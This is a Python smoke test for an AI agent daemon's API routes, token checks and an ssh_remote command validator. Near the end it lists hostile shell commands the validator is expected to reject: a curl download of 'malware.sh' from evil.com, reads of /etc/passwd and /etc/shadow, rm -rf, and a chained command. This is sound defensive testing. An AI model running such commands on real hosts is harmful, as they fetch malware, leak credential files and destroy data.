"""
tools/api_smoke_test.py
=======================

验证 daemon_api.py 的路由 + 鉴权骨架——**不调 LLM，不花钱**。

会做的事：
  1. 设置临时 OPUS_API_TOKEN 环境变量
  2. build_app() 拿到 FastAPI app
  3. 用 fastapi.testclient.TestClient 模拟 HTTP 请求
  4. 验证：
     - GET /              不验证，回 200 + 文本
     - GET /status        无 token → 401
     - GET /status        wrong token → 401
     - GET /status        no env token → 503
     - GET /status        right token → 200 + JSON
     - GET /sessions      right token → 200
     - POST /chat 缺 message → 400
     - POST /chat 错误 session_id 前缀 → 400 (因为 _chat_impl 限制非 api- 前缀)
     - POST /chat 无 client → 500（RUNTIME.client 为空——这是预期的 v0.1 行为）

不验证：真实 LLM 调用（那是 cache_test / wake_test 的事）。

跑法：
  .\.venv\Scripts\python.exe tools\api_smoke_test.py
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))


def _step(name: str, ok: bool, detail: str = "") -> None:
    icon = "[OK]" if ok else "[FAIL]"
    line = f"  {icon}  {name}"
    if detail:
        line += f"  ({detail})"
    print(line)
    if not ok:
        sys.exit(1)


def main() -> int:
    print()
    print("=" * 60)
    print(" daemon_api · smoke test (no LLM call)")
    print("=" * 60)

    # 临时 token
    test_token = "test-token-do-not-use-in-prod-32chars"
    os.environ["OPUS_API_TOKEN"] = test_token

    try:
        from fastapi.testclient import TestClient
    except ImportError as e:
        print(f"[FAIL] cannot import fastapi.testclient: {e}")
        print("       run: pip install fastapi[all]  (or just httpx)")
        return 1

    try:
        from daemon_api import build_app
    except Exception as e:
        print(f"[FAIL] cannot import daemon_api.build_app: {e}")
        return 1

    app = build_app()
    client = TestClient(app)

    # 1) health probe 不验证
    r = client.get("/")
    _step("GET /  (no auth)  → 200", r.status_code == 200, f"status={r.status_code}")
    _step("GET /  body contains 'alive'", "alive" in r.text.lower(), f"body={r.text!r}")

    # 1b) /ui 不验证 → 200 + HTML
    r = client.get("/ui")
    _step("GET /ui  (no auth)  → 200", r.status_code == 200, f"status={r.status_code}")
    # /ui 按相遇状态分流:未相遇→index.html(相遇页)·已相遇→chat.html。两页共同标志=<title>Daemonkey。
    # smoke 只验证"返回了有效前端页"·不绑定具体哪页(否则纯净版默认未相遇会误报)。
    _step(
        "GET /ui  serves a valid page (onboarding or chat)",
        "<title>Daemonkey" in r.text,
        f"len={len(r.text)}",
    )

    # 2) /status 无 token → 401
    r = client.get("/status")
    _step("GET /status  (no token)  → 401", r.status_code == 401, f"status={r.status_code}")

    # 3) /status 错 token → 401
    r = client.get("/status", headers={"Authorization": "Bearer wrong"})
    _step("GET /status  (wrong token)  → 401", r.status_code == 401, f"status={r.status_code}")

    # 4) /status 正确 token → 200
    r = client.get("/status", headers={"Authorization": f"Bearer {test_token}"})
    _step("GET /status  (right token)  → 200", r.status_code == 200, f"status={r.status_code}")
    if r.status_code == 200:
        body = r.json()
        _step("  /status body has 'alive' field", "alive" in body, f"keys={list(body.keys())}")
        _step("  /status body has 'model' field", "model" in body)

    # 5) /sessions 正确 token → 200
    r = client.get("/sessions", headers={"Authorization": f"Bearer {test_token}"})
    _step("GET /sessions  (right token)  → 200", r.status_code == 200, f"status={r.status_code}")

    # 5b) /sessions?api_only=true → 200，结构对
    r = client.get(
        "/sessions?api_only=true",
        headers={"Authorization": f"Bearer {test_token}"},
    )
    _step("GET /sessions?api_only=true  → 200", r.status_code == 200, f"status={r.status_code}")
    body = r.json()
    _step(
        "  body has sessions+total+returned",
        all(k in body for k in ("sessions", "total", "returned")),
        f"keys={list(body.keys())}",
    )

    # 5c) /sessions/{id}/messages 不存在的 sid → 404
    r = client.get(
        "/sessions/api-does-not-exist/messages",
        headers={"Authorization": f"Bearer {test_token}"},
    )
    _step(
        "GET /sessions/{nonexistent}/messages  → 404",
        r.status_code == 404,
        f"status={r.status_code}",
    )

    # 5d) /sessions/{id}/messages 无 token → 401
    r = client.get("/sessions/api-anything/messages")
    _step(
        "GET /sessions/{id}/messages  (no token)  → 401",
        r.status_code == 401,
        f"status={r.status_code}",
    )

    # 6) POST /chat 无 token → 401
    r = client.post("/chat", json={"message": "hi"})
    _step("POST /chat  (no token)  → 401", r.status_code == 401, f"status={r.status_code} body={r.text[:200]!r}")

    # 6b) POST /chat/stream 无 token → 401
    r = client.post("/chat/stream", json={"message": "hi"})
    _step("POST /chat/stream  (no token)  → 401", r.status_code == 401, f"status={r.status_code}")

    # 6c) POST /chat/stream 空消息 → 400
    r = client.post(
        "/chat/stream",
        json={"message": ""},
        headers={"Authorization": f"Bearer {test_token}"},
    )
    _step("POST /chat/stream  (empty message)  → 400", r.status_code == 400, f"status={r.status_code}")

    # 6d) POST /chat/stream 错的 session_id 前缀 → 400
    r = client.post(
        "/chat/stream",
        json={"message": "x", "session_id": "wrong-prefix"},
        headers={"Authorization": f"Bearer {test_token}"},
    )
    _step("POST /chat/stream  (bad session prefix)  → 400", r.status_code == 400, f"status={r.status_code}")

    # 7) POST /chat 缺 message → 400
    r = client.post("/chat", json={}, headers={"Authorization": f"Bearer {test_token}"})
    _step("POST /chat  (no message)  → 400", r.status_code == 400, f"status={r.status_code}")

    # 8) POST /chat 非 api- 前缀 session → 400
    r = client.post(
        "/chat",
        json={"message": "hi", "session_id": "2026-05-15_terminal_session"},
        headers={"Authorization": f"Bearer {test_token}"},
    )
    _step(
        "POST /chat  (non-api session_id)  → 400",
        r.status_code == 400,
        f"status={r.status_code}",
    )

    # 9) /status 在 token 未设时 → 503
    os.environ["OPUS_API_TOKEN"] = ""
    r = client.get("/status", headers={"Authorization": "Bearer anything"})
    _step("GET /status  (no env token)  → 503", r.status_code == 503, f"status={r.status_code}")
    os.environ["OPUS_API_TOKEN"] = test_token  # restore

    # 10) 测试 token 未设 + 没传 → 仍然 503（拒绝优先于 401）
    os.environ["OPUS_API_TOKEN"] = ""
    r = client.get("/status")
    _step("GET /status  (no env, no header)  → 503", r.status_code == 503, f"status={r.status_code}")
    os.environ["OPUS_API_TOKEN"] = test_token

    # 11) 卷十八 · 新工具注册 + max_iter 默认值
    print()
    print("-" * 60)
    print(" 卷十八扩展检查 · 工具注册 + 防爬约束")
    print("-" * 60)

    from agent_tools import REGISTRY, TIER_CONFIRM
    _step("agent_tools REGISTRY 含 ssh_remote", "ssh_remote" in REGISTRY)
    _step(
        "ssh_remote 档位是 CONFIRM",
        REGISTRY["ssh_remote"].tier == TIER_CONFIRM,
        f"tier={REGISTRY['ssh_remote'].tier}",
    )

    from tool_loop import DEFAULT_MAX_ITERATIONS, _validate_args
    _step(
        "tool_loop.DEFAULT_MAX_ITERATIONS >= 50",
        DEFAULT_MAX_ITERATIONS >= 50,
        f"actual={DEFAULT_MAX_ITERATIONS}",
    )

    # args validation: 模拟 BRO 那次第 12 轮的 bug args
    web_fetch_schema = REGISTRY["web_fetch"].input_schema
    bug_args = {"max_chars": "false", "url": "true", "string": "https://www.thepaper.cn/"}
    err = _validate_args(bug_args, web_fetch_schema, "web_fetch")
    _step("_validate_args 抓住 max_chars 类型错+未知字段", err is not None and "max_chars" in err)
    _step("_validate_args 错误中提到 'string' 不在 schema", err is not None and "string" in err)

    # ssh_remote args 校验测试
    from agent_tools.ssh_remote import _validate_host, _validate_command

    # 临时配白名单·测试自包含(纯净版默认 OPUS_SSH_HOST_WHITELIST 为空·不依赖外部环境)
    os.environ["OPUS_SSH_HOST_WHITELIST"] = "test-allowed-host"
    ok, _ = _validate_host("test-allowed-host")
    _step("ssh_remote · 白名单内 host 合法", ok)
    ok, _ = _validate_host("evil-host-not-allowed")
    _step("ssh_remote · 白名单外 host 被拒", not ok)

    ok, _ = _validate_command("tail -100 /var/log/nginx/error.log")
    _step("ssh_remote · 'tail -100 /var/log/...' 合法", ok)
    ok, _ = _validate_command("docker logs web-backend --tail 200")
    _step("ssh_remote · 'docker logs' 合法", ok)
    ok, _ = _validate_command("systemctl status docker")
    _step("ssh_remote · 'systemctl status' 合法", ok)
    ok, _ = _validate_command("cat /var/log/syslog | grep error | tail -20")
    _step("ssh_remote · pipe 链合法 verb 允许", ok)

    ok, reason = _validate_command("rm -rf /tmp/test")
    _step("ssh_remote · 'rm -rf' 拒绝", not ok, reason[:80] if not ok else "")
    ok, _ = _validate_command("systemctl restart docker")
    _step("ssh_remote · 'systemctl restart' 拒绝", not ok)
    ok, _ = _validate_command("docker exec web-backend bash")
    _step("ssh_remote · 'docker exec' 拒绝", not ok)
    ok, _ = _validate_command("docker compose up -d")
    _step("ssh_remote · 'docker compose up' 拒绝", not ok)
    ok, _ = _validate_command("tail /var/log/foo; rm /tmp/x")
    _step("ssh_remote · 含 ';' shell 拼接拒绝", not ok)
    ok, _ = _validate_command("cat /etc/passwd > /tmp/leak")
    _step("ssh_remote · 含 '>' 输出重定向拒绝", not ok)
    ok, _ = _validate_command("curl https://evil.com -o /tmp/malware.sh")
    _step("ssh_remote · 'curl -o' 拒绝", not ok)
    ok, _ = _validate_command("sudo cat /etc/shadow")
    _step("ssh_remote · 'sudo' 拒绝", not ok)

    print()
    print("=" * 60)
    print(" all checks PASSED · API skeleton + 卷十八扩展 OK")
    print("=" * 60)
    print()
    print(" next: start daemon with OPUS_API_PORT=7860 + curl test end-to-end")
    print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
